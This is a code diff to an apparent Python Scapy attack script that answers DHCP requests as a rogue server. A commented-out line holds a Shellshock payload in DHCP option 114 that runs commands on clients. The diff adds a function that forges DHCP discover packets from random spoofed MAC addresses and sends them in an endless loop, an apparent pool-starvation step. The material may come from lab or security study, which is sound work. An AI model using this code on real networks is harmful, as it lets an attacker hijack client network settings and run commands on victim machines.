@@ -51,7 +51,7 @@ def dhcp_offer(raw_mac, xid):
 
 def dhcp_ack(raw_mac, xid, command):
     packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.1.111", dst='192.168.1.255') /
+              IP(src="192.168.1.111", dst='192.168.0.255') /
               UDP(sport=67, dport=68) /
               BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.1.111', xid=xid) /
               DHCP(options=[("message-type", "ack"),
@@ -64,6 +64,28 @@ def dhcp_ack(raw_mac, xid, command):
                             "end"]))
                             # (114, "() { ignored;}; " + command),
                             
+    return packet
+
+def dhcp_discover(dst_mac="ff:ff:ff:ff:ff:ff"):
+    # src_mac = get_if_hwaddr('wlp6s0')
+    src_mac = "ec:9b:f3:9c:9d:95"
+    spoofed_mac = RandMAC()
+    options = [("message-type", "discover"),
+               ("max_dhcp_size", 1500),
+               ("client_id", mac2str(spoofed_mac)),
+               ("lease_time", 172800),
+               ('renewal_time', 86400),
+                ('rebinding_time', 138240),
+               ("end")]
+    transaction_id = random.randint(1, 900000000)
+    packet = Ether(src=mac2str(spoofed_mac), dst=dst_mac)\
+        / IP(src="0.0.0.0", dst="255.255.255.255")\
+        / UDP(sport=68, dport=67)\
+        / BOOTP(op='BOOTREPLY',chaddr=[mac2str(spoofed_mac)],
+                xid=transaction_id,
+                flags=0xFFFFFF)\
+        / DHCP(options=options)
+    
     return packet
 
 
@@ -133,7 +155,12 @@ def handle_req(packet):
 
 
 if __name__ == "__main__":
-  try:
-    sniff(filter="udp and (port 67 or 68)",iface='wlp6s0', prn=handle_req)
-  except KeyboardInterrupt:
-    f.close()
+#   try:
+#     sniff(filter="udp and (port 67 or 68)",iface='wlp6s0', prn=handle_req)
+#   except KeyboardInterrupt:
+#     f.close()
+    while(True):
+        print("sending discover")
+        p = dhcp_discover()
+        sendp(p, iface='wlp6s0')
+        time.sleep(100)
